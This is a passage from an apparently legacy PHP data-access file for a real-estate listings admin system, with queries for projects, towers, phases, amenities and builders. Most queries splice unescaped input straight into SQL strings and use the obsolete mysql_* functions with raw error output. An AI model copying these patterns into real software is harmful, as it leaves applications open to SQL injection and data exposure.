							t.TOWER_NAME,t.TOWER_ID,t.NO_OF_FLOORS,t.REMARKS,STILT,t.NO_OF_FLATS,t.TOWER_FACING_DIRECTION,t.ACTUAL_COMPLETION_DATE,t.PHASE_ID,p.PHASE_NAME  
						FROM 
							".RESI_PROJECT_TOWER_DETAILS." t LEFT JOIN resi_project_phase p 
						ON   
							t.PHASE_ID = p.PHASE_ID
						WHERE 
							t.PROJECT_ID = '".$projectId."' ORDER BY t.TOWER_NAME ASC";
		$res_Sel=	mysql_query($qrySel);
		$arrDetail	=	array();
		while($data = mysql_fetch_assoc($res_Sel))
		{
			array_push($arrDetail,$data);
		}
		return $arrDetail;
	}

	function fetch_towers_in_phase($projectId, $phaseId)
	{
		$qrySel	=	"SELECT TOWER_NAME,TOWER_ID,PHASE_ID FROM ".RESI_PROJECT_TOWER_DETAILS."  WHERE PROJECT_ID = '".$projectId."' AND PHASE_ID=".$phaseId." GROUP BY TOWER_NAME ORDER BY TOWER_NAME ASC";
		$res_Sel=	mysql_query($qrySel);
		$arrDetail	=	array();
		while($data = mysql_fetch_assoc($res_Sel))
		{
			array_push($arrDetail,$data);
		}
		return $arrDetail;
	}

	function fetch_towerDetails_for_phase($projectId)
	{
		// Returns towers that are available for phase to select. So, if tower1 is selected in phase1 and tower2 is selected by no other phase,
		// in that case - both tower1 and tower2 are available to phase1 to select from.
		
		$qrySel	=	"SELECT TOWER_NAME,TOWER_ID,PHASE_ID FROM ".RESI_PROJECT_TOWER_DETAILS."  WHERE PROJECT_ID = '".$projectId."' GROUP BY TOWER_NAME ORDER BY TOWER_NAME ASC";				
		$res_Sel=	mysql_query($qrySel);
		$arrDetail	=	array();
		while($data = mysql_fetch_assoc($res_Sel))
		{
			array_push($arrDetail,$data);
		}
		return $arrDetail;
	}

    function fetch_phaseDetails($projectId)
    {
        $qrySel	=	"SELECT PHASE_ID, PHASE_NAME FROM ".RESI_PROJECT_PHASE."  WHERE PROJECT_ID = '".$projectId."' GROUP BY PHASE_NAME ORDER BY PHASE_NAME ASC";
        $res_Sel=	mysql_query($qrySel);
        $arrDetail	=	array();
        while($data = mysql_fetch_assoc($res_Sel))
        {
            array_push($arrDetail,$data);
        }
        return $arrDetail;
    }

	function insert_towerconstructionStatus($towerId,$no_of_floors_completed,$remark,$expected_delivery_date,$effDt,$projectId)
	{
		 $qry_ins	=	"
				INSERT INTO ". RESI_PROJ_TOWER_CONSTRUCTION_STATUS."
				SET
					TOWER_ID				=	'".$towerId."',
					NO_OF_FLOORS_COMPLETED	=	'".$no_of_floors_completed."',
					GENERAL_REMARK			=	'".$remark."',
					EXPECTED_DELIVERY_DATE	=	'".$expected_delivery_date."',
					SUBMITTED_DATE   		=	'".$effDt."'";

		$res_ins=mysql_query($qry_ins) OR DIE(mysql_error());
		if($res_ins)
		{
			$last_id = mysql_insert_id();
			audit_insert($last_id,'insert','resi_proj_tower_construction_status',$projectId);
			return 1;
		}

	}
	/***************Query for Locality selected************/
	function localityList($cityid,$suburbId)
	{
		$localitySelect = Array();
		$sql = "SELECT A.LOCALITY_ID, A.SUBURB_ID, A.CITY_ID, A.LABEL FROM ".LOCALITY." AS A WHERE A.CITY_ID = " . $cityid;

		if ($suburbId != '') {
		$sql .= " AND A.SUBURB_ID = " . $suburbId;
		}

		$sql .= " AND A.ACTIVE=1 ";

		$data = mysql_query($sql);

		while($dataArr = mysql_fetch_assoc($data))
		{
			$localitySelect[$dataArr['LOCALITY_ID']] = $dataArr['LABEL'];
		}
		 return $localitySelect;
		/***************end Query for Locality selected************/

	}

	/**********project insert***************/
	function UpdateProject($txtProjectName, $builderId, $cityId,$suburbId,$localityId,$txtProjectDescription,$txtProjectRemark,$txtAddress,$txtProjectDesc,$txtProjectSource,$project_type,$txtProjectLocation,$txtProjectLattitude,$txtProjectLongitude,$txtProjectMetaTitle,$txtMetaKeywords,$txtMetaDescription,$DisplayOrder,$Active,$Status,$txtProjectURL,$Featured,$txtDisclaimer,$payment,$no_of_towers,$no_of_flats,$pre_launch_date,$eff_date_to,$special_offer,$display_flag,$youtube_link,$bank_list,$price,$app,$approvals,$project_size,$no_of_lift,$powerBackup,$architect,$offer_heading,$offer_desc,$BuilderName,$power_backup_capacity,$no_of_villa,$eff_date_to_prom,$ProjectId,$residential,$township,$plot,$open_space,$Booking_Status,$shouldDisplayPrice,$txtCallingRemark,$txtAuditRemark,$launchedUnits,$reasonUnlaunchedUnits)
	{
		$Completion = $Completion." Onwards";
		$Sql = "UPDATE " .RESI_PROJECT."
				SET
					PROJECT_NAME  	      		= '".d_($txtProjectName)."',
					PROJECT_DESCRIPTION 	  	= '".d_($txtProjectDescription)."',
					PROJECT_REMARK 	  			= '".d_($txtProjectRemark)."',
					PROJECT_ADDRESS	 	  		= '".d_($txtAddress)."',
					BUILDER_ID 	      			= '".d_($builderId)."',
					BUILDER_NAME 	      		= '".d_($BuilderName)."',
					CITY_ID	      				= '".d_($cityId)."',
					SUBURB_ID		 	      	= '".d_($suburbId)."',
					LOCALITY_ID		 	      	= '".d_($localityId)."',
					OPTIONS_DESC 	      		= '".d_($txtProjectDesc)."',
					PROJECT_TYPE_ID	      		= '".d_($project_type)."',
					LOCATION_DESC	 	      	= '".d_($txtProjectLocation)."',
					LATITUDE			 	    = '".d_($txtProjectLattitude)."',
					LONGITUDE		 	      	= '".d_($txtProjectLongitude)."',
					META_TITLE		 	      	= '".d_($txtProjectMetaTitle)."',
					META_KEYWORDS	 	      	= '".d_($txtMetaKeywords)."',
					META_DESCRIPTION 	      	= '".d_($txtMetaDescription)."',
					ACTIVE			 	      	= '".d_($Active)."',
					PROJECT_STATUS 	      		= '".d_($Status)."',
					PROJECT_URL		 	      	= '".d_($txtProjectURL)."',
					FEATURED			 	    = '".d_($Featured)."',
					COMPLETION_DATE	      		= '".d_($Completion)."',
					PRICE_DISCLAIMER 	      	= '".d_($txtDisclaimer)."',
					PAYMENT_PLAN				=	'".$payment."',
					NO_OF_TOWERS				=	'".$no_of_towers."',
					NO_OF_FLATS					=	'".$no_of_flats."',
					PRE_LAUNCH_DATE             =   '".$pre_launch_date."',
					LAUNCH_DATE					=	'".$eff_date_to."',
					BANK_LIST					=	'".$bank_list."',
					YOUTUBE_VIDEO				=	'".$youtube_link."',
					PRICE_LIST					=	'".addslashes($price)."',
					APPLICATION_FORM			=	'".addslashes($app)."',
					OFFER						=	'".$special_offer."',
					DISPLAY_FLAG				=	'".$display_flag."',
					OFFER_HEADING				=	'".$offer_heading."',
					OFFER_DESC					=	'".$offer_desc."',
					APPROVALS					=	'".$approvals."',
					PROJECT_SIZE				=	'".$project_size."',
					NO_OF_LIFTS_PER_TOWER		=	'".$no_of_lift."',
					POWER_BACKUP				=	'".$powerBackup."',
					ARCHITECT_NAME				=	'".$architect."',
					POWER_BACKUP_CAPACITY		=	'".$power_backup_capacity."',
					NO_OF_VILLA					=	'".$no_of_villa."',
					PROMISED_COMPLETION_DATE	=	'".$eff_date_to_prom."',
					SOURCE_OF_INFORMATION		=	'".$txtProjectSource."',
					RESIDENTIAL					=	'".$residential."',
					TOWNSHIP					=	'".$township."',
                    NO_OF_PLOTS					=	'".$plot."',
					OPEN_SPACE					=	'".$open_space."',
					BOOKING_STATUS 				=	'".$Booking_Status."',
					SHOULD_DISPLAY_PRICE        =   '".$shouldDisplayPrice."',
					CALLING_REMARK				=	'".$txtCallingRemark."',
					LAUNCHED_UNITS				=	'".$launchedUnits."',
					REASON_UNLAUNCHED_UNITS		=   '".$reasonUnlaunchedUnits."',
					AUDIT_REMARK				=	'".$txtAuditRemark."'";
					if($display_flag=='1'){
						$Sql.= ", DISPLAY_ORDER_LOCALITY='30', DISPLAY_ORDER ='30'";
					}else{
						$Sql.= ", DISPLAY_ORDER_LOCALITY='99999', DISPLAY_ORDER ='99999'";
					}

					$Sql.= " WHERE PROJECT_ID = '".$ProjectId."'";
			$ExecSql = mysql_query($Sql) or die(mysql_error().' Error in function UpdateProject()');

			audit_insert($ProjectId,'update','resi_project',$ProjectId);
			return $ProjectId;

			/********************End Query for new project add in display order table*************************************************/

	}

	function specification($projectId)
	{
		$qrySel	=	"SELECT * FROM ".RESI_PROJ_SPECIFICATION." WHERE PROJECT_ID = '".$projectId."'";
		$res_Sel=	mysql_query($qrySel);
		$arrDetail	=	array();
		while($data = mysql_fetch_assoc($res_Sel))
		{
			array_push($arrDetail,$data);
		}
		if(count($arrDetail)==0)
		{
			$arrDetail[0]['FLOORING_MASTER_BEDROOM'] = '';
			$arrDetail[0]['FLOORING_OTHER_BEDROOM'] = '';
			$arrDetail[0]['FLOORING_LIVING_DINING'] = '';
			$arrDetail[0]['FLOORING_KITCHEN'] = '';
			$arrDetail[0]['FLOORING_TOILETS'] = '';
			$arrDetail[0]['FLOORING_BALCONY'] = '';
			$arrDetail[0]['WALLS_INTERIOR'] = '';
			$arrDetail[0]['WALLS_EXTERIOR'] = '';
			$arrDetail[0]['WALLS_KITCHEN'] = '';
			$arrDetail[0]['WALLS_TOILETS'] = '';
			$arrDetail[0]['FITTINGS_AND_FIXTURES_KITCHEN'] = '';
			$arrDetail[0]['FITTINGS_AND_FIXTURES_TOILETS'] = '';
			$arrDetail[0]['DOORS_MAIN'] = '';
			$arrDetail[0]['DOORS_INTERNAL'] = '';
			$arrDetail[0]['WINDOWS'] = '';
			$arrDetail[0]['ELECTRICAL_FITTINGS'] = '';	
			$arrDetail[0]['OTHERS'] = '';
		}
		return $arrDetail;
	}

	$arrNotninty	= array();
	$arrDetail		= array();
	$arrninty		= array();
	function ProjectAmenities($projectId,&$arrNotninty,&$arrDetail,&$arrninty)
	{
		$qrySel	=	"SELECT * FROM ".RESI_PROJECT_AMENITIES." WHERE PROJECT_ID = '".$projectId."'";
		$res_Sel=	mysql_query($qrySel);
		$arrDetail	=	array();
		$cnt = 1;
		while($data = mysql_fetch_assoc($res_Sel))
		{
			array_push($arrDetail,$data);
			if($data['AMENITY_ID']<=6)
			{
				$arrNotninty[$data['AMENITY_ID']] = $data['AMENITY_DISPLAY_NAME'];
			}
			else
			{
				$arrninty[$cnt] = $data['AMENITY_DISPLAY_NAME'];
				$cnt++;
			}
		}
		//print_r($arrNotninty);
		//return $arrDetail;
	}

	function deleteAmenities($projectId)
	{
		$qryDel	=	"DELETE FROM ".RESI_PROJECT_AMENITIES." WHERE PROJECT_ID = '".$projectId."'";
		$res_Del=	mysql_query($qryDel);
		if($res_Del)
			return 1;
	}

	function deleteSpecification($projectId)
	{
		$qryDel	=	"DELETE FROM ".RESI_PROJ_SPECIFICATION." WHERE PROJECT_ID = '".$projectId."'";
		$res_Del=	mysql_query($qryDel);
		if($res_Del)
			return 1;
	}
    
	function ProjectType($projectId)
	{
		global $arrProjectType_P;
		global $arrProjectType;
		global $arrProjectType_VA;
		
		$qry	=	"SELECT * FROM  ".RESI_PROJECT_OPTIONS." WHERE PROJECT_ID = '".$projectId."'";
		$res	=	mysql_query($qry);

		while($data	=	mysql_fetch_assoc($res))
		{
			if($data['UNIT_TYPE'] == 'Apartment')
			{
				$arrProjectType['OPTIONS_ID'][]				=	$data['OPTIONS_ID'];
				$arrProjectType['UNIT_NAME'][]				=	$data['UNIT_NAME'];
				$arrProjectType['UNIT_TYPE'][]				=	$data['UNIT_TYPE'];
				$arrProjectType['SIZE'][]					=	$data['SIZE'];
				$arrProjectType['MEASURE'][]				=	$data['MEASURE'];
				$arrProjectType['PRICE_PER_UNIT_AREA'][]	=	$data['PRICE_PER_UNIT_AREA'];
				$arrProjectType['PRICE_PER_UNIT_AREA_DP'][]	=	$data['PRICE_PER_UNIT_AREA_DP'];
				$arrProjectType['PRICE_PER_UNIT_AREA_FP'][]	=	$data['PRICE_PER_UNIT_AREA_FP'];
				$arrProjectType['STATUS'][]					=	$data['STATUS'];
				$arrProjectType['BEDROOMS'][]				=	$data['BEDROOMS'];
				$arrProjectType['CLP_VISIBLE'][]			=	$data['CLP_VISIBLE'];
				$arrProjectType['DP_VISIBLE'][]				=	$data['DP_VISIBLE'];
				$arrProjectType['FP_VISIBLE'][]				=	$data['FP_VISIBLE'];
				$arrProjectType['DISCLAIMER_CLP'][]			=	$data['DISCLAIMER_CLP'];
				$arrProjectType['DISCLAIMER_DP'][]			=	$data['DISCLAIMER_DP'];
				$arrProjectType['DISCLAIMER_FP'][]			=	$data['DISCLAIMER_FP'];
				$arrProjectType['BATHROOMS'][]				=	$data['BATHROOMS'];
				$arrProjectType['CREATED_DATE'][]			=	$data['CREATED_DATE'];
				$arrProjectType['STUDY_ROOM'][]				=	$data['STUDY_ROOM'];
				$arrProjectType['SERVANT_ROOM'][]			=	$data['SERVANT_ROOM'];
				$arrProjectType['BALCONY'][]				=	$data['BALCONY'];
				$arrProjectType['POOJA_ROOM'][]				=	$data['POOJA_ROOM'];
				$arrProjectType['NO_OF_FLATS'][]			=	$data['NO_OF_FLATS'];
				$arrProjectType['AVAILABLE_NO_OF_FLATS'][]	=	$data['AVAILABLE_NO_OF_FLATS'];
				$arrProjectType['VILLA_PLOT_AREA'][]		=	$data['VILLA_PLOT_AREA'];
				$arrProjectType['VILLA_NO_FLOORS'][]		=	$data['VILLA_NO_FLOORS'];
				$arrProjectType['VILLA_TERRACE_AREA'][]		=	$data['VILLA_TERRACE_AREA'];
				$arrProjectType['VILLA_GARDEN_AREA'][]		=	$data['VILLA_GARDEN_AREA'];
				$arrProjectType['CARPET_AREA'][]			=	$data['CARPET_AREA'];
				$arrProjectType['PLOT_AREA_MEASURE'][]		=	$data['PLOT_AREA_MEASURE'];
				$arrProjectType['PRICE_PER_UNIT_LOW'][]		=	$data['PRICE_PER_UNIT_LOW'];
				$arrProjectType['PRICE_PER_UNIT_HIGH'][]	=	$data['PRICE_PER_UNIT_HIGH'];
				$arrProjectType['NO_OF_FLOORS'][]			=	$data['NO_OF_FLOORS'];
				$arrProjectType['RESALE_PRICE'][]			=	$data['RESALE_PRICE'];
			}
            else if($data['UNIT_TYPE'] == 'Plot')
			{
				$arrProjectType_P['OPTIONS_ID'][]				=	$data['OPTIONS_ID'];
				$arrProjectType_P['UNIT_NAME'][]				=	$data['UNIT_NAME'];
				$arrProjectType_P['UNIT_TYPE'][]				=	$data['UNIT_TYPE'];
				$arrProjectType_P['PRICE_PER_UNIT_AREA'][]		=	$data['PRICE_PER_UNIT_AREA'];
                $arrProjectType_P['SIZE'][]                     =	$data['SIZE'];
				$arrProjectType_P['MEASURE'][]                  =	$data['MEASURE'];
				$arrProjectType_P['CREATED_DATE'][]             =	$data['CREATED_DATE'];
                $arrProjectType_P['TOTAL_PLOT_AREA'][]          =	$data['TOTAL_PLOT_AREA'];
                $arrProjectType_P['LENGTH_OF_PLOT'][]           =	$data['LENGTH_OF_PLOT'];
                $arrProjectType_P['BREADTH_OF_PLOT'][]          =	$data['BREADTH_OF_PLOT'];
			}
			else
			{
				$arrProjectType_VA['OPTIONS_ID'][]				=	$data['OPTIONS_ID'];
				$arrProjectType_VA['UNIT_NAME'][]				=	$data['UNIT_NAME'];
				$arrProjectType_VA['UNIT_TYPE'][]				=	$data['UNIT_TYPE'];
				$arrProjectType_VA['SIZE'][]					=	$data['SIZE'];
				$arrProjectType_VA['MEASURE'][]					=	$data['MEASURE'];
				$arrProjectType_VA['PRICE_PER_UNIT_AREA'][]		=	$data['PRICE_PER_UNIT_AREA'];
				$arrProjectType_VA['PRICE_PER_UNIT_AREA_DP'][]	=	$data['PRICE_PER_UNIT_AREA_DP'];
				$arrProjectType_VA['PRICE_PER_UNIT_AREA_FP'][]	=	$data['PRICE_PER_UNIT_AREA_FP'];
				$arrProjectType_VA['STATUS'][]					=	$data['STATUS'];
				$arrProjectType_VA['BEDROOMS'][]				=	$data['BEDROOMS'];
				$arrProjectType_VA['CLP_VISIBLE'][]				=	$data['CLP_VISIBLE'];
				$arrProjectType_VA['DP_VISIBLE'][]				=	$data['DP_VISIBLE'];
				$arrProjectType_VA['FP_VISIBLE'][]				=	$data['FP_VISIBLE'];
				$arrProjectType_VA['DISCLAIMER_CLP'][]			=	$data['DISCLAIMER_CLP'];
				$arrProjectType_VA['DISCLAIMER_DP'][]			=	$data['DISCLAIMER_DP'];
				$arrProjectType_VA['DISCLAIMER_FP'][]			=	$data['DISCLAIMER_FP'];
				$arrProjectType_VA['BATHROOMS'][]				=	$data['BATHROOMS'];
				$arrProjectType_VA['CREATED_DATE'][]			=	$data['CREATED_DATE'];
				$arrProjectType_VA['STUDY_ROOM'][]				=	$data['STUDY_ROOM'];
				$arrProjectType_VA['SERVANT_ROOM'][]			=	$data['SERVANT_ROOM'];
				$arrProjectType_VA['BALCONY'][]					=	$data['BALCONY'];
				$arrProjectType_VA['POOJA_ROOM'][]				=	$data['POOJA_ROOM'];
				$arrProjectType_VA['NO_OF_FLATS'][]				=	$data['NO_OF_FLATS'];
				$arrProjectType_VA['AVAILABLE_NO_OF_FLATS'][]	=	$data['AVAILABLE_NO_OF_FLATS'];
				$arrProjectType_VA['VILLA_PLOT_AREA'][]			=	$data['VILLA_PLOT_AREA'];
				$arrProjectType_VA['VILLA_NO_FLOORS'][]			=	$data['VILLA_NO_FLOORS'];
				$arrProjectType_VA['VILLA_TERRACE_AREA'][]		=	$data['VILLA_TERRACE_AREA'];
				$arrProjectType_VA['VILLA_GARDEN_AREA'][]		=	$data['VILLA_GARDEN_AREA'];
				$arrProjectType_VA['CARPET_AREA'][]				=	$data['CARPET_AREA'];
				$arrProjectType_VA['PLOT_AREA_MEASURE'][]		=	$data['PLOT_AREA_MEASURE'];
				$arrProjectType_VA['PRICE_PER_UNIT_LOW'][]		=	$data['PRICE_PER_UNIT_LOW'];
				$arrProjectType_VA['PRICE_PER_UNIT_HIGH'][]		=	$data['PRICE_PER_UNIT_HIGH'];
				$arrProjectType_VA['NO_OF_FLOORS'][]			=	$data['NO_OF_FLOORS'];
				$arrProjectType_VA['RESALE_PRICE'][]			=	$data['RESALE_PRICE'];
			}
		}

	}

	function allProjectImages($projectId)
	{
		$sqlListingImages = "SELECT *  FROM ".PROJECT_PLAN_IMAGES." WHERE  PROJECT_ID = " . $projectId. "";

		$data = mysql_query($sqlListingImages);
		$ImageDataListingArr = array();
		while ($dataListingArr = mysql_fetch_assoc($data))
		{
			$ImageDataListingArr [] = $dataListingArr;
		}
		return $ImageDataListingArr;
	}

	/*******Fetch all floor plans images of a project******/
	function allProjectFloorImages($projectId)
	{
		$qryOpt =	"SELECT OPTIONS_ID,UNIT_NAME,SIZE,MEASURE FROM ".RESI_PROJECT_OPTIONS." WHERE PROJECT_ID = " . $projectId;
		$resOpt	=	mysql_query($qryOpt);

		$ImageDataListingArr = array();
		while($dataOpt = mysql_fetch_assoc($resOpt))
		{
			$sqlListingImages = "SELECT *  FROM ".RESI_FLOOR_PLANS." WHERE  OPTION_ID ='".$dataOpt['OPTIONS_ID']."'";

			$data = mysql_query($sqlListingImages);
			while ($dataListingArr = mysql_fetch_assoc($data))
			{
				$dataListingArr['SIZE'] = $dataOpt['SIZE'];
				$dataListingArr['UNIT_NAME'] = $dataOpt['UNIT_NAME'];
				$dataListingArr['MEASURE'] = $dataOpt['MEASURE'];
				$ImageDataListingArr[] = $dataListingArr;
			}
		}
		return $ImageDataListingArr;
	}

	/*********search a tower exists or not in given array***************/
	function searchTower($towerArray,$newTower)
	{
		$flg = 0;
		foreach($towerArray as $k=>$val)
		{
			if($newTower == $val['TOWER_NAME'])
			{
				$flg = 1;
			}
		}
		if($flg == 1)
			return 1;
		else
			return 0;
	}

    /*********search a phase exists or not in given array***************/
    function searchPhase($phaseArray,$newPhaseName)
    {
        foreach($phaseArray as $k=>$val)
        {
            if($newPhaseName == $val['PHASE_NAME'])
            {
                return $k;
            }
        }
        return -1;
    }

    /**********phase details with tower id**************/
    function phaseDetailsForId($phaseId)
    {
        $sql = "SELECT * FROM ".RESI_PROJECT_PHASE."
                        WHERE
                        PHASE_ID ='".$phaseId."'";

        $data = mysql_query($sql);
        $arr = array();
        while ($dataarr = mysql_fetch_assoc($data))
        {
            $arr [] = $dataarr;
        }
        return $arr;
    }

	/**********tower detail with tower id**************/
	function towerDetailsForId($towerId)
	{
		$sql = "SELECT *  FROM ".RESI_PROJECT_TOWER_DETAILS."
					WHERE
					TOWER_ID ='".$towerId."'";

		$data = mysql_query($sql);
		$arr = array();
		while ($dataarr = mysql_fetch_assoc($data))
		{
			$arr [] = $dataarr;
		}
		return $arr;
	}

    /********function for update phase detail**********/
    function update_phase($projectId,$phaseId,$phasename,$launch_date,$completion_date,$remark)
    {
        $qry_ins	=	"
                    UPDATE ". RESI_PROJECT_PHASE."
                    SET
                    	PHASE_NAME  		            	=	'".$phasename."',
                        LAUNCH_DATE  		            	=	'".$launch_date."',
                        COMPLETION_DATE  		        	=	'".$completion_date."',
                        REMARKS		            			=	'".$remark."'
                    WHERE
                        PROJECT_ID	= '".$projectId."'
                    AND
                        PHASE_ID   = '".$phaseId."'";

        $res_ins=mysql_query($qry_ins) OR DIE(mysql_error());
        if($res_ins)
        {
            $last_id = mysql_insert_id();
            audit_insert($last_id,'update','resi_project_phase',$projectId);
            return 1;
        }
    }

	/********function for update tower detail**********/
	function update_towerDetail($projectId,$TowerId,$no_of_floors,$stilt,$no_of_flats_per_floor,$towerface,$completion_date,$remark)
	{
		$qry_ins	=	"
				UPDATE ". RESI_PROJECT_TOWER_DETAILS."
				SET
					NO_OF_FLOORS			=	'".$no_of_floors."',
					REMARKS					=	'".$remark."',
					STILT					=	'".$stilt."',
					NO_OF_FLATS			    =	'".$no_of_flats_per_floor."',
					TOWER_FACING_DIRECTION	=	'".$towerface."',
					ACTUAL_COMPLETION_DATE	=	'".$completion_date."'
				WHERE
					PROJECT_ID	= '".$projectId."'
				AND
					TOWER_ID   = '".$TowerId."'";

		$res_ins=mysql_query($qry_ins) OR DIE(mysql_error());
		if($res_ins)
		{
			$last_id = mysql_insert_id();
			audit_insert($last_id,'insert','resi_project_tower_details',$projectId);
			return 1;
		}
	}
	
	function getfrom_phase_quantity($phaseId,$bedId,$unit_type='')
	{
		if($phaseId == '' ||  $phaseId == '0') return false; 
		$sql = "
				SELECT QUANTITY
					FROM resi_phase_quantity
				WHERE					
					BEDROOMS='".$bedId."'
					AND PHASE_ID ='".$phaseId."' 
					AND UNIT_TYPE = '".$unit_type."'
				ORDER BY QID DESC ";

		$data = mysql_query($sql) or die(mysql_error());
		$arr = array();
		while ($dataarr = mysql_fetch_assoc($data))
		{
			$arr[] = $dataarr;
		}
		return $arr;
	}

	/***************bed supply of a project*************/
	function bedSupplyDetail($projectId,$bedId,$project_type,$phaseId='')
	{
		$sql = "SELECT *
					FROM ".RESI_PROJ_SUPPLY."
				WHERE
					PROJECT_ID ='".$projectId."'
				AND
					NO_OF_BEDROOMS	=	'".$bedId."'
				AND
					PROJECT_TYPE    =  '".$project_type."'";
		if($phaseId!='') $sql .= " AND PHASE_ID='".$phaseId."' ";
		$sql .=" ORDER BY PROJ_SUPPLY_ID DESC LIMIT 1";

		$data = mysql_query($sql) or die(mysql_error());
		$arr = array();
		while ($dataarr = mysql_fetch_assoc($data))
		{
			$arr[] = $dataarr;
		}
		return $arr;

	}

	/***************tower of a project*************/
	function towerDetail($towerId)
	{
		 $sql = "SELECT *
					FROM ".RESI_PROJ_TOWER_CONSTRUCTION_STATUS."
				WHERE
					TOWER_ID ='".$towerId."'  ORDER BY TOWER_CONST_STATUS_ID DESC LIMIT 1";

		$data = mysql_query($sql) or die(mysql_error());
		$arr = array();
		while ($dataarr = mysql_fetch_assoc($data))
		{
			$arr [] = $dataarr;
		}
		return $arr;

	}

	/*************FUNCTION FOR FETCH LATEST CONSTRUCTION STATUS***************/
	function costructionDetail($projectId)
	{
		 $sql = "SELECT *
					FROM ".RESI_PROJ_EXPECTED_COMPLETION."
				WHERE
					PROJECT_ID ='".$projectId."'  ORDER BY EXPECTED_COMPLETION_ID DESC LIMIT 1";

		$data = mysql_query($sql) or die(mysql_error());
		$dataarr = mysql_fetch_assoc($data);
		return $dataarr;

	}

	/***********Builder management**************/
	function InsertBuilder($txtBuilderName, $txtBuilderDescription, $txtBuilderUrl,$DisplayOrder,$txtMetaTitle,$txtMetaKeywords,$txtMetaDescription,$imgname,$address,$city,$pincode,$ceo,$employee,$date,$delivered_project,$area_delivered,$ongoing_project,$website,$revenue,$debt,$contactArr)

	{
		$Sql = "INSERT INTO " .RESI_BUILDER." SET
				BUILDER_NAME  	   				= '".d_($txtBuilderName)."',
				DESCRIPTION 	  				= '".d_($txtBuilderDescription)."',
				URL	 	  						= '".d_($txtBuilderUrl)."',
				BUILDER_IMAGE 					= '".d_($imgname)."',
				DISPLAY_ORDER					= '".d_($DisplayOrder)."',
				META_TITLE	 					= '".d_($txtMetaTitle)."',
				META_KEYWORDS	 				= '".d_($txtMetaKeywords)."',
				ADDRESS			 				= '".d_($address)."',
				CITY			 				= '".d_($city)."',
				PINCODE			 				= '".d_($pincode)."',
				META_DESCRIPTION				= '".d_($txtMetaDescription)."',
				CEO_MD_NAME						= '".d_($ceo)."',
				TOTAL_NO_OF_EMPL				= '".d_($employee)."',
				TOTAL_NO_OF_DELIVERED_PROJECT	= '".$delivered_project."',
				AREA_DELIVERED					='".$area_delivered."',
				ONGOING_PROJECTS				= '".$ongoing_project."',
				WEBSITE							='".$website."',
				REVENUE							='".$revenue."',
				DEBT							='".$debt."',
				ESTABLISHED_DATE	= '".$date."'";

		$ExecSql = mysql_query($Sql) or die(mysql_error().' Error in function InsertBuilder()');
		$lastId  = mysql_insert_id();
		$list    = ''; 

		$cnt =0;
		foreach($contactArr as $k=>$v)
		{
			if($v[$cnt] != '')
			{
				$name		=	$v[$cnt];
				$phone		=	$contactArr['Phone'][$cnt];
				$email		=	$contactArr['Email'][$cnt];
				$projects	=	$contactArr['Projects'][$cnt];
				
				$qry = "INSERT INTO ".BUILDER_CONTACT_INFO."
						SET
							NAME			=	'".$name."',
							BUILDER_ID		=	'".$lastId."',
							PHONE			=	'".$phone."',
							EMAIL			=	'".$email."',
							PROJECTS		=	'".$projects."',
							SUBMITTED_DATE	=	now()";
				$res = mysql_query($qry) or die(mysql_error()." Error in builder contact info");	
			}
			$cnt++;
		}
		return 1;

	}

	/*******delete builders*********/
	function DeleteBuilder($ID)
	{
		$Sql 		= "DELETE FROM ".RESI_BUILDER." WHERE BUILDER_ID = '".$ID."'";

		$ExecSql 	= mysql_query($Sql) or die(mysql_error().' Error in function DeleteBuilder()');

		return 1;
	}

	/*******function for fetch last inserted data in resi project option arc table *************/
	function lastUpdatedData($projectId)
	{
		$qry	=	"SELECT * from ".RESI_PROJECT_OPTIONS_ARC." WHERE PROJECT_ID = '".$projectId."' ORDER BY SUBMITTED_DATE DESC";
		$res	=	mysql_query($qry);
		$arrOptionArc = array();
		while($data = mysql_fetch_assoc($res))
		{
			array_push($arrOptionArc,$data);
		}
		return $arrOptionArc;
	}

	/*******function for fetch last inserted or updated data in audit table *************/
	function AuditTblDataByTblName($tblName,$projectId)
	{
		$arcTable = $tblName."_arc";

		$qry	 =	"SELECT * FROM ".AUDIT."
					WHERE
						(TABLE_NAME = '".$tblName."'
						OR
						TABLE_NAME = '".$arcTable."')
					AND
						 	PROJECT_ID = '".$projectId."'
					ORDER BY
						ACTION_DATE DESC LIMIT 1";

		$res	  =	mysql_query($qry);
		$arrAudit = array();
		$data = mysql_fetch_assoc($res);
			array_push($arrAudit,$data);
		return $arrAudit;
	}

	/********update builder if already exists***************/
	function UpdateBuilder($txtBuilderName, $txtBuilderDescription, $txtBuilderUrl,$DisplayOrder,$txtMetaTitle,$txtMetaKeywords,$txtMetaDescription,$imgname,$builderid,$address,$city,$pincode,$ceo,$employee,$established,$delivered_project,$area_delivered,$ongoing_project,$website,$revenue,$debt,$contactArr)
	{
		 $Sql = "UPDATE " .RESI_BUILDER." SET
				BUILDER_NAME  	   				= '".d_($txtBuilderName)."',
				DESCRIPTION 	  				= '".d_($txtBuilderDescription)."',
				URL	 	  						= '".d_($txtBuilderUrl)."',
				BUILDER_IMAGE 	   				= '".d_($imgname)."',
				DISPLAY_ORDER					= '".d_($DisplayOrder)."',
				META_TITLE	 					= '".d_($txtMetaTitle)."',
				META_KEYWORDS	 				= '".d_($txtMetaKeywords)."',
				ADDRESS			 				= '".d_($address)."',
				CITY			 				= '".d_($city)."',
				PINCODE			 				= '".d_($pincode)."',
				META_DESCRIPTION				= '".d_($txtMetaDescription)."',
				ESTABLISHED_DATE				= '".d_($established)."',
				CEO_MD_NAME						= '".d_($ceo)."',
				TOTAL_NO_OF_DELIVERED_PROJECT	= '".$delivered_project."',
				AREA_DELIVERED					='".$area_delivered."',
				ONGOING_PROJECTS				= '".$ongoing_project."',
				WEBSITE							='".$website."',
				REVENUE							='".$revenue."',
				DEBT							='".$debt."',
				TOTAL_NO_OF_EMPL				= '".d_($employee)."'

			WHERE	
				BUILDER_ID			=	'".$builderid."'";//die("here");

		$list    = ''; 
		$del	=	"DELETE FROM ".BUILDER_CONTACT_INFO." WHERE BUILDER_ID = '".$builderid."'";
		$resDel	= mysql_query($del) or die(mysql_error());
		$cnt =0;

		foreach($contactArr['Name'] as $k=>$v)
		{
			if($v != '')
			{
				$name		=	$contactArr['Name'][$cnt];
				$phone		=	$contactArr['Phone'][$cnt];
				$email		=	$contactArr['Email'][$cnt];
				$projects	=	$contactArr['Projects'][$cnt];
				
			$qry = "INSERT INTO ".BUILDER_CONTACT_INFO."
						SET
							NAME			=	'".$name."',
							BUILDER_ID		=	'".$builderid."',
							PHONE			=	'".$phone."',
							EMAIL			=	'".$email."',
							PROJECTS		=	'".$projects."',
							SUBMITTED_DATE	=	now()";
				$res = mysql_query($qry) or die(mysql_error()." Error in builder contact info");	
			}
			$cnt++;
		}

